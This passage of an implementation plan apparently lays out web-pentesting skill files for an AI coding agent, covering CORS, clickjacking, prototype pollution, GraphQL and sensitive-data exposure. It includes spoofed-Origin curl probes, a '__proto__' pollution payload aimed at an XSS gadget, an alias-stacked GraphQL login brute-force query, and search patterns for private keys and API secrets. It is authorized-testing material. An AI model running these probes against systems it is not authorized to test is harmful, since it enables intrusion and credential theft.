6. `## Finding writeup` — title `Web Cache Poisoning via <header>`. Severity: persistent XSS via cache = Critical; DoS-only = High. Evidence: poisoning request, subsequent clean fetch showing poisoned response, cache headers. Fix: include the affected header in the cache key; strip unknown headers at the cache; disable caching for authenticated/personalised routes.
7. `## References` — OWASP WSTG Cache-specific (2021 addition), PortSwigger Web cache poisoning (`https://portswigger.net/web-security/web-cache-poisoning`), CWE-349.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-cache-poisoning (unkeyed input via Param Miner)"`.

---

### Task 26: `.claude/skills/testing-cors/SKILL.md`

**Source material:** Spec "testing-cors"; `mcp-burp/SKILL.md`; `recon-js-analysis/SKILL.md`, `recon-sitemap-crawl/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-cors`

**Frontmatter:**
```yaml
---
name: testing-cors
description: Test for OWASP A05 CORS misconfiguration — wildcard with credentials, reflected origin, null origin, subdomain trust.
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-js-analysis`, `recon-sitemap-crawl`, `mcp-burp`. Paragraph: target exposes authenticated JSON endpoints that serve `Access-Control-Allow-Origin`.
2. `## Signal to look for` — `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`; `Access-Control-Allow-Origin` reflects the `Origin` header; `null` origin accepted.
3. `## Test steps` — (1) Send request with `Origin: https://attacker.com`; inspect response's ACAO. (2) Null origin: `Origin: null`. (3) Subdomain trust: `Origin: https://evil.target.example.com`. (4) Confirm exploitability: craft a page at `attacker.com` that fetches the authenticated endpoint cross-origin.
4. `## Tool commands`:
   - **Shell:** `curl -sI -H "Origin: https://attacker.com" https://target.example.com/api/profile | grep -i 'access-control'` (`# Success: Access-Control-Allow-Origin: https://attacker.com + Allow-Credentials: true`).
   - **MCP:** `burp_repeater_send(raw_base64=<b64 with Origin header>, host=..., tab_name="cors-probe")`; response headers via `burp_proxy_request`.
5. `## Interpret results` — ACAO reflecting attacker origin with credentials = exploitable. Wildcard without credentials = weaker finding (public data).
6. `## Finding writeup` — title `CORS Misconfiguration at <endpoint>`. Severity: authenticated cross-origin read = High-Critical; reflective origin without credentials = Medium. Evidence: request with spoofed Origin, response ACAO + ACAC, cross-origin PoC. Fix: ACAO allow-list; never reflect `Origin` directly; never combine `*` with credentials.
7. `## References` — OWASP WSTG CLNT-07, PortSwigger CORS (`https://portswigger.net/web-security/cors`), CWE-942.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-cors (wildcard + reflected + null + subdomain)"`.

---

### Task 27: `.claude/skills/testing-clickjacking/SKILL.md`

**Source material:** Spec "testing-clickjacking"; `mcp-browser/SKILL.md`; `recon-sitemap-crawl/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-clickjacking`

**Frontmatter:**
```yaml
---
name: testing-clickjacking
description: Test for Clickjacking — missing X-Frame-Options or frame-ancestors CSP directive on sensitive state-changing pages.
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-sitemap-crawl`, `mcp-browser`. Paragraph: sensitive state-changing pages should reject framing via `X-Frame-Options: DENY/SAMEORIGIN` or CSP `frame-ancestors`.
2. `## Signal to look for` — sensitive pages (delete account, confirm payment, grant permission) missing both framing-protection headers.
3. `## Test steps` — (1) Check headers: `curl -sI https://target.example.com/settings`. (2) If missing: craft PoC HTML with `<iframe src="<target>"></iframe>`. (3) `browser_navigate` to hosted PoC; visually confirm the target renders inside the frame.
4. `## Tool commands`:
   - **Shell:** `curl -sI https://target.example.com/settings | grep -iE 'x-frame-options|content-security-policy'` (`# Success: neither header present`).
   - **MCP:** `browser_navigate(url="file:///tmp/clickjack-poc.html")`; `browser_screenshot(full_page=true)` to capture visual proof.
5. `## Interpret results` — target renders in the frame = vulnerable. False positive: CSP `frame-ancestors` overrides XFO; a CSP with `frame-ancestors 'none'` is sufficient protection even without XFO.
6. `## Finding writeup` — title `Clickjacking on <sensitive-page>`. Severity: UI-redress on auth action = Medium-High; on static page = Low. Evidence: headers, PoC HTML, screenshot of framed target. Fix: `X-Frame-Options: DENY` or CSP `frame-ancestors 'self'`.
7. `## References` — OWASP WSTG CLNT-09, PortSwigger Clickjacking (`https://portswigger.net/web-security/clickjacking`), CWE-1021.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-clickjacking (header check + frame PoC)"`.

---

### Task 28: `.claude/skills/testing-prototype-pollution/SKILL.md`

**Source material:** Spec "testing-prototype-pollution"; `mcp-browser/SKILL.md`; `recon-js-analysis/SKILL.md`, `recon-sitemap-crawl/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-prototype-pollution`

**Frontmatter:**
```yaml
---
name: testing-prototype-pollution
description: Test for Prototype Pollution in Node.js and client-side JS — source/sink analysis, gadget identification, payload delivery.
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-js-analysis`, `recon-sitemap-crawl`, `mcp-browser`. Paragraph: JS-heavy app that uses object-merge libraries (lodash, jquery-extend, Object.assign with user input).
2. `## Signal to look for` — JSON bodies with deeply-nested objects merged into app state; URL params parsed with `qs` or similar; source/sink analysis from `recon-js-analysis` flagged potential gadgets.
3. `## Test steps` — (1) Pollution probe: send `{"__proto__": {"polluted": "yes"}}` in a merge-accepting endpoint. (2) Runtime check: `browser_eval("({}).polluted")` — if returns `"yes"`, pollution succeeded. (3) Gadget search: look for `Object.prototype.X` reads in JS sinks (CSP, function flags, HTML-templating). (4) End-to-end exploit: pollute a property that triggers an XSS gadget (e.g. `Object.prototype.innerHTML`).
4. `## Tool commands`:
   - **Shell:** static grep on downloaded bundles for `Object.prototype.` usage.
   - **MCP:** `burp_repeater_send(raw_base64=<b64 with __proto__ payload>, host=..., tab_name="proto-probe")`; `browser_eval(expression="({}).polluted")` to confirm runtime pollution; DOM Invader prototype-pollution mode is the Burp Pro path to automated confirmation.
5. `## Interpret results` — runtime object inherits the polluted property = confirmed pollution. Exploitation depends on gadget availability — pollution alone without a gadget is a Medium finding; gadget chain to XSS is High.
6. `## Finding writeup` — title `Prototype Pollution via <parameter>`. Severity: XSS via gadget = High; DoS or logic bypass = Medium. Evidence: polluting request, `browser_eval` result confirming pollution, gadget exploit if demonstrated. Fix: `Object.freeze(Object.prototype)`; `Object.create(null)` for dictionaries; validate object keys against `__proto__`, `constructor`, `prototype`.
7. `## References` — PortSwigger Prototype pollution (`https://portswigger.net/web-security/prototype-pollution`), OWASP WSTG CLNT-13, CWE-1321.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-prototype-pollution (__proto__ probe + gadget)"`.

---

### Task 29: `.claude/skills/testing-graphql/SKILL.md`

**Source material:** Spec "testing-graphql"; `mcp-burp/SKILL.md`; `recon-api-enum/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-graphql`

**Frontmatter:**
```yaml
---
name: testing-graphql
description: Test for GraphQL-specific flaws — introspection leakage, batching abuse, alias-based rate-limit bypass, field duplication, deep-query DoS.
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-api-enum`, `mcp-burp`. Paragraph: target exposes a GraphQL endpoint (`/graphql`, `/api/graphql`).
2. `## Signal to look for` — `Content-Type: application/json` POST responses with `{"data": {...}}` shape; `query { __schema ... }` acceptance.
3. `## Test steps` — (1) Introspection enumeration (cross-ref `recon-api-enum`). (2) Alias-based rate-limit bypass: stack 100 aliased invocations of a protected mutation in one POST. (3) Field duplication (auth bypass in some implementations): `{ me { id } me { email } me { role } }`. (4) Deep-query DoS: nested relations with cyclic types — respect RoE (DoS-adjacent; see `methodology-rules-of-engagement`). (5) Batching attack: submit an array of queries in one request.
4. `## Tool commands`:
   - **Shell:** curl with JSON body of stacked aliases:
     ```
     curl -X POST -H 'Content-Type: application/json' --data '{"query":"{ a1: login(pass:\"p1\") a2: login(pass:\"p2\") ... }"}' https://target.example.com/graphql
     ```
   - **MCP:** `burp_repeater_send(raw_base64=<b64 with alias-stacked query>, host=..., tab_name="graphql-alias")`; response correlates each alias to its own result.
5. `## Interpret results` — multiple alias-stacked attempts successful in one request = rate-limit bypass. Field duplication yielding different auth responses = auth flaw. Deep-query 5xx or timeout = DoS susceptibility.
6. `## Finding writeup` — title `GraphQL <flaw> at <endpoint>`. Severity: auth-bypass via alias/field duplication = High-Critical; introspection leak = Medium; deep-query DoS = Medium. Evidence: query, response, impact proof. Fix: disable introspection in production; query depth/complexity limits; per-field authorization checks; rate-limit at the field-execution layer.
7. `## References` — OWASP API Security Top 10 (API8: Lack of Resources & Rate Limiting), PortSwigger GraphQL (`https://portswigger.net/web-security/graphql`), CWE-863.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-graphql (alias bypass + duplication + deep-query)"`.

---

### Task 30: `.claude/skills/testing-sensitive-data-exposure/SKILL.md`

**Source material:** Spec "testing-sensitive-data-exposure"; `mcp-burp/SKILL.md`; `recon-sitemap-crawl/SKILL.md`, `recon-content-discovery/SKILL.md`.

- [ ] **Step 1:** `mkdir -p /home/kali/Web-MCP/.claude/skills/testing-sensitive-data-exposure`

**Frontmatter:**
```yaml
---
name: testing-sensitive-data-exposure
description: Test for OWASP A02 Sensitive Data Exposure in responses — PII, tokens, credentials, stack traces, debug output.
---
```

**Body:**
1. `## When to use` — prereq: methodology + `recon-sitemap-crawl`, `recon-content-discovery`, `mcp-burp`.
2. `## Signal to look for` — stack traces in production; `Authorization:` echoed in responses; private keys or tokens in HTML comments / JS bundles; verbose `X-Debug:`, `X-Powered-By:` headers with sensitive values.
3. `## Test steps` — (1) Regex scan across captured history: `burp_proxy_history(contains="Authorization: ")`. (2) Separate scans for common secret patterns: `BEGIN RSA`, `sk_live_`, `AWS_SECRET_ACCESS_KEY`, `password=`. (3) Trigger error paths (invalid IDs, malformed JSON) and capture stack traces. (4) Check for PII in responses (SSN, credit-card patterns) and flag.
4. `## Tool commands`:
   - **Shell:** `trufflehog filesystem --include-paths .claude --no-update` over downloaded responses; manual `grep` for secret patterns.
   - **MCP:** `burp_proxy_history(contains="BEGIN RSA")`, `burp_proxy_history(contains="password=")`, `burp_proxy_history(contains="Exception")` to find stack traces.
5. `## Interpret results` — any real credential, PII, or server-internal detail in a response = finding. False positives: placeholder secrets (`YOUR_API_KEY_HERE`, `sk_test_*`) — flag as informational only.
6. `## Finding writeup` — title `Sensitive Data Exposure in <response>`. Severity: credentials leaked = Critical; PII = High; stack trace with path disclosure = Low-Medium. Evidence: redacted excerpt of the response showing the disclosure (redact real data before filing). Fix: redact at the API/templating layer; catch and swallow exception details in production; purge secrets from JS bundles; set `X-Debug: false` in prod.
7. `## References` — OWASP WSTG INFO-05, PortSwigger Information disclosure (`https://portswigger.net/web-security/information-disclosure`), CWE-200.
8. `## Authorization note` — verbatim.

**Length target:** ≤ 260 lines.

- [ ] **Step 2-4:** Standard verification.
- [ ] **Step 5: Commit** — `git commit -m "feat(skills): testing-sensitive-data-exposure (regex scan + trigger errors)"`.

---

### Task 31: Final verification (one follow-up commit if issues found)

- [ ] **Step 1: Confirm all thirty files tracked**

```bash
cd /home/kali/Web-MCP
git ls-files .claude/skills/testing-*/SKILL.md | wc -l
```
Expected: `30`.

- [ ] **Step 2: Name-vs-directory consistency across all 30**

```bash
cd /home/kali/Web-MCP
for d in .claude/skills/testing-*; do
  dirname=$(basename "$d")
  name=$(grep -m1 '^name:' "$d/SKILL.md" | awk '{print $2}')
  if [ "$dirname" = "$name" ]; then echo "OK: $dirname"; else echo "MISMATCH: $dirname vs $name"; fi
done
```
Expected: 30 `OK:` lines.

- [ ] **Step 3: Description length check**

```bash
cd /home/kali/Web-MCP
for f in .claude/skills/testing-*/SKILL.md; do
  d=$(grep -m1 '^description:' "$f" | sed 's/^description:[[:space:]]*//')
  echo "${#d} chars: $f"
done | sort -n | tail -5
```
Expected: all values ≤ 175.

- [ ] **Step 4: Section count check**

```bash
cd /home/kali/Web-MCP
for f in .claude/skills/testing-*/SKILL.md; do
  c=$(grep -c '^## ' "$f")
  if [ "$c" != "8" ]; then echo "$c sections: $f"; fi
done
```
Expected: (no output).

- [ ] **Step 5: Authorization paragraph verbatim on all 30**

```bash
cd /home/kali/Web-MCP
for f in .claude/skills/testing-*/SKILL.md; do
  if ! grep -q "Only use against systems you are authorized to test" "$f"; then echo "MISSING: $f"; fi
done
```
Expected: (no output).

- [ ] **Step 6: Cross-references use names only (no paths)**

```bash
cd /home/kali/Web-MCP
grep -rn "\.claude/skills/" .claude/skills/testing-*/SKILL.md || echo "OK: no path-form cross-references"
```
Expected: `OK: no path-form cross-references`.

- [ ] **Step 7: No specific forward reference to unwritten reporting-* skills by name**

```bash
cd /home/kali/Web-MCP
grep -rn "reporting-[a-z-]" .claude/skills/testing-*/SKILL.md | grep -v "reporting-\*" || echo "OK: no specific forward refs"
```
Expected: `OK: no specific forward refs`.

- [ ] **Step 8: No italic-glob rendering bugs**

```bash
cd /home/kali/Web-MCP
grep -rnE '_[^_]*\*_|_[^_]*\*[^_]*_' .claude/skills/testing-*/SKILL.md || echo "OK: no italic-glob patterns"
```
Expected: `OK: no italic-glob patterns`.

- [ ] **Step 9: All burp_scope_modify calls include remove=**

```bash
cd /home/kali/Web-MCP
grep -rn 'burp_scope_modify' .claude/skills/testing-*/SKILL.md > /tmp/scope_modify.txt
add_count=$(grep -c 'add=' /tmp/scope_modify.txt)
remove_count=$(grep -c 'remove=' /tmp/scope_modify.txt)
echo "add= count: $add_count; remove= count: $remove_count"
```
Expected: add_count = remove_count (each call has both).

- [ ] **Step 10: If any of steps 1-9 fail, fix inline and make one follow-up commit**

```bash
git add .
git commit -m "fix(skills): testing-* — corrections from final verification"
```

---

## Plan-end verification

- [ ] Thirty feature commits on top of the spec commit, in batch order: tasks 1-10 (Batch 1), 11-19 (Batch 2), 20-30 (Batch 3).
- [ ] All 9 final structural checks (Task 31 steps 1-9) pass (or a single follow-up commit fixes the issues).
- [ ] Each skill's `## When to use` opens with a `Prerequisite skills:` line naming at least `methodology-scoping`, `methodology-rules-of-engagement`, and the correct `mcp-*` and `recon-*` prerequisites per the spec's Cross-reference map.
- [ ] Each skill's `## Tool commands` has both a Shell block and an MCP block (hybrid style from sub-project 3).
- [ ] Cross-references use skill names only, no paths.
- [ ] No forward references to specific unwritten `reporting-*` skills by name (only category-level `reporting-*` references allowed).
